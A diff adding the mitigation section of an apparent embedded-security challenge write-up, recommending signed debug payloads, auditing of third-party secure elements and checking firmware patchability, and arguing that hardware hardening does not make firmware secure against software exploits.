+<p>At a conceptual level, the physical design of this system is an improvement over something like <a href="https://microcorruption.com/debugger/Whitehorse">Whitehorse</a>. Adding the logical <code>AND</code> transistor creates a layer of defense in depth enforced at a physics level. Bypassing this protection requires compromising two different chips. That said, there are two failures in this implementation.</p>
+
+<h5>1. Do not execute arbitrary user-supplied payloads on the main MCU.</h5>
+
+<p>A glaring issue remains unexamined: <em>nothing about this architecture requires it to allow arbitrary unsigned code execution on the main MCU</em>. Debug payloads should be signed (as on St. John's or Cold Lake) or eliminated from the implementation altogether.</p>
+
+<p>This mitigation requires attackers to bypass the signature verification mechanism or find another issue that allows them to gain a foothold on the main MCU, adding another layer of defense-in-depth.</p>
+
+
+<h5>2. Do not implicitly trust third-party vendors to write secure code.</h5>
+
+<p>The graver vulnerability lies in the (ostensibly third-party) secure element. There is no easy way to audit the backing software implementation. Patching would be the vendor's responsibility, and there may be no firmware update mechanism.</p>
+
+<p>In the best-case scenario, this requires waiting for the third-party vendor to ship out patches. In a worst-case scenario, it is unpatchable, and fixing the vulnerability requires releasing a new generation of hardware.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>
+
+<input type="checkbox" id="sn-1" class="sidenote-toggle" />
+<span class="sidenote">
+This risk management "strategy" is a commonplace. 
+</span>
+</p>
+
+<h3>The Problem With Hardware Security</h3>
+<h5>The Semantics Of Security Through Obscurity</h5>
+
+<p>Secure elements are designed, in part, to protect against hardware attacks. The problem in the hardware security world is that manufacturers tend to conflate two kinds of security through obscurity. There is a credible argument that undocumented hardware countermeasures demonstrably impede attackers. In this sense, the system relies on hardware-level security through obscurity. Disclosing the hardware-level workings<label for="sn-1" class="sidenote-toggle sidenote-number"></label>
+
+<input type="checkbox" id="sn-1" class="sidenote-toggle" />
+<span class="sidenote">
+	I.e., data sheets or schematics.
+</span>
+
+of the chip would put that protection in jeopardy.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>
+
+<input type="checkbox" id="sn-1" class="sidenote-toggle" />
+<span class="sidenote">
+This "protection" is a byproduct of the relatively nascent general state of the hardware security field. Falling equipment prices and more accessible education about the subject area will eventually undermine it.
+</span>
+</p>
+
+<p>That said, the fact that this logic only applies to physical hardware-level security (not firmware or software security) cannot be understated. Just because code runs on a processor secured against hardware attacks does not magically make that code secure against software exploits. Regardless of the platform, software security through obscurity is not an effective countermeasure.</p>
+
+<p>The assumption seems to be that <em>hardware-level</em> security implies software-level security. This belief may stem from the assumption that attackers must extract firmware via a hardware attack and that black box firmware analysis is infeasibly expensive. As the exploit described herein demonstrates, this is not always the case.</p>
+
+<p>Secure processor code is like any other code. Performing source code vulnerability analysis and penetration testing is essential. Blind trust in these devices is foolish—especially for security-critical applications.</p>
+
+<h5>Patching</h5>
+
+<p>Unpatchable black box hardware is depressingly frequent among chips of this variety. It is critically important to determine (before hardware architecture finalization) whether firmware updates are possible for this component and, if so, whether the vendor has responded appropriately to security issues in the past. Any "secure processor" that cannot pass muster necessitates its replacement with one that can.</p>
